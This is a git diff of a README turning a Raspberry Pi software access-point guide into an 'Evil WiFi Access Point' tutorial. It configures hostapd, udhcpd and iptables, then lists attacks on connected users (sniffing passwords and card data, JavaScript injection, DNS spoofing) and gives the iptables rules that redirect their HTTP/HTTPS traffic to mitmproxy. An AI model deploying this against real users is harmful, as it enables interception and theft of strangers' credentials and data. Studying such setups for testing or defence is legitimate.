@@ -1,8 +1,10 @@
-# SoftAP WiFi
-Software based Access Point 
+# Evil WiFi Access Point
+
 
 ## Introduction
 We are going to use a Raspberry Pi and an Edimax WiFi dongle to create WiFi with any name and using MITMProxy will monitor data communication that clients are doing.
+
+There are lot of articles/tutorials already written by many knowledgeable persons and the only difference this writting is it is based on my personal experience.
 
 ## Tools
 We are going to use below hardware and software tools.
@@ -62,30 +64,82 @@ Follow the steps in **_Prerequisites_** section in [this great tutorial](http://
 Download the compatible hostapd (for rtl871xdrv drivers) for Edimax from this [link](http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip).
 
 #### udhcpd
+[uDHCP](https://en.wikipedia.org/wiki/Udhcpc) or micro-DHCP is an implementation of DHCP (RFC-2131) for embbeded device. In short, it is small but powerfull enough for our purpose.
+
++ Install udhcpd 
+    `sudo apt-get install udhcpd`
+
++ Configure /etc/udhcpd.conf
+    `start 192.168.1.2`
+    `end 192.168.1.254`
+    opt dns 8.8.8.8 8.8.4.4
+    option subnet 255.255.255.0
+    opt router 192.168.1.1
+    `option dns 192.168.0.1`
+
++ Enable udhcpd in /etc/defaults/udhcpd
+
++ Start the service
+    `sudo service udhcpd restart`
 
 #### hostapd
 
-#### IPTables
-Allow traffic from wlan0 to b forwarded to eth0
++ Install hostapd
+    `sudo apt-get install hostapd`
 
-`$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT`
++ Configure /etc/hostapd/hostapd.conf
+    interface=wlan0
+    driver=rtl871xdrv
+    ssid=Open WiFi
+    channel=11
+
+#### IPTables
+Allow traffic from wlan0 to be forwarded to eth0
+
+    `$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT`
 
 Allow traffic from eth0 to wlan0 only if related
 
-`$ iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT`
+    `$ iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT`
 
 Do IP Masquerade after traffic routed to eth0
 
-`$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`
-
-Redirect all traffic destined to port 80 and 443 to our proxy server port 8080
-
-`$ iptables -t nat -A PREROUTING -i wlan0 -p tcp —dport 80 -j REDIRECT —to-port 8080`
-
-`$ iptables -t nat -A PREROUTING -i wlan0 -p tcp —dport 443 -j REDIRECT —to-port 8080`
+    `$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`
 
 
+### No Evil Yet??
+It is true, till now we have not done anything evil. We have just built our own WiFi router. This can be usefull when we are in a hotel or dorm where only wired connection is avaiable and we want be adventurous and build our own WiFi router to create an WiFi access point.
+However, as it is said, every tool is also a weapon based on how you use it.
 
+#### What evil can we do?
+
++ Monitor all traffic
++ Sniff sensitive data (password, credit card) from HTTP
++ Inject JavaScript in webpages and if not sure how fun/dangerous that can be watch this [DEFCON talk by Chema Alonso](https://www.youtube.com/watch?v=0QT4YJn7oVI)
++ Spoof DNS to make user visit malicious website
++ Install self-signed certificate in users computer which we can use to serve spoofed HTTPS website
+
+#### How?
+
++ [Install MITMProxy](http://docs.mitmproxy.org/en/latest/install.html) by follow the lisk.
+
++ Start MITMProxy in [Transparent Mode](http://docs.mitmproxy.org/en/latest/modes.html#transparent-proxy)
+    `mitmproxy -T --host`
+
+
++ Redirect all traffic destined to port 80 and 443 to our proxy server port 8080
+
+    `$ iptables -t nat -A PREROUTING -i wlan0 -p tcp —dport 80 -j REDIRECT —to-port 8080`
+
+    `$ iptables -t nat -A PREROUTING -i wlan0 -p tcp —dport 443 -j REDIRECT —to-port 8080`
+
+### TODO
++ Complete the write-up.
++ Write ansible script to automate the setup.
++ MANA attack
+
+### References and Links
++ http://docs.mitmproxy.org/en/latest/transparent/linux.html
 
 
 
